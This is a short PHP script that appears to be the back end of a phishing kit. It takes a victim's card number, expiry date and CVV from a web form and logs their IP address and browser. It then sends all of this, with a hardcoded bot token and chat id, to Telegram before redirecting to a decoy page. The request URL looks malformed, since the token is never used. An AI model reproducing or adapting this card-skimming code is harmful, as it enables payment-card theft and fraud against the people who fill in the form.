<?php
ob_start();
$zabi = getenv("REMOTE_ADDR");
$message = "-------DKK-CC---------\n";
$message .= "CC-M : ".$_POST['zz']."\n";
$message .= "EXP : ".$_POST['aa']."\n";
$message .= "CVV : ".$_POST['qq']."\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------DKK-CC--------------------\n";
$token = "9108139118:AAEisCNeCi_q_-0DNVTz_icKHkYbrU_dTRc";
$data = [
    'text' => $message,
    'chat_id' => '-1003987841987'
];
@file_get_contents("https://telegram.org?" . http_build_query($data));

header("Location: /pro.html");
exit();
?>
